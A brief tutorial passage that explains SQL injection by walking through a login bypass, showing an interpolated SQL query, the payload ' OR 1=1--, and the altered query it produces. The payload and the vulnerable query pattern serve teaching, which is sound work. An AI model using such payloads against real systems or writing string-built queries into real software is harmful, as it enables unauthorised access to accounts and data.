
---
### SQLi Example — Subverting Application Logic

A common example is **bypassing a login mechanism**.

Suppose the application executes:

```
SELECT * FROM users
WHERE username = '$username'
AND password = '$password';
```

Normally, the user must provide a valid username and password.

If the username input is:

```
' OR 1=1--
```

the query may become:

```
SELECT * FROM users
WHERE username = '' OR 1=1--'
AND password = 'anything';
```

Here:

```
1=1
```

is always true, while `--` comments out the remaining SQL.

The application may therefore authenticate the attacker **without knowing a valid password**.

**Impact:** SQL injection can alter the application's intended logic, such as bypassing authentication or authorization checks.